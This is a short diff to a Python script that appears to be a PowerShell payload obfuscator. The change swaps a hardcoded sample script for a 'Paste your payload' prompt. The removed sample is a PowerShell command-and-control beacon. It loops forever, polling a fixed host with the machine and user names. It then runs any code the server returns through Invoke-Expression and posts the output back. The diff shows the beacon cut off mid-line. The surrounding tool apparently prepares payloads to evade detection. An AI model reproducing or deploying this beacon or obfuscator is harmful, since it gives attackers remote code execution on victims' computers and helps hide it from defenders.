@@ -2,13 +2,7 @@ import re
 import string
 
 # Sample PowerShell script
-powershell_script = """
-
-Start-Process $env:PSHOME\powershell.exe -ArgumentList {$s='192.168.1.157:8';$i='2bace6e0-e1e7441c-3de851c7';$p='http://';for (;;){try{$response=Invoke-WebRequest -UseBasicParsing -Uri ($p+$s+"/2bace6e0/$env:COMPUTERNAME/$env:USERNAME") -Headers @{"Authorization"=$i};if($response.Content -ne 'None'){$code=$response.Content;$r=Invoke-Expression $code;$r=$r | Out-String;Invoke-WebRequest -Uri ($p+$s+"/3de851c7") -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8
-
-
-
-"""
+powershell_script = input("Paste your payload ")
 
 # Dictionary to store the consistent replacement strings
 replacement_dict = {}
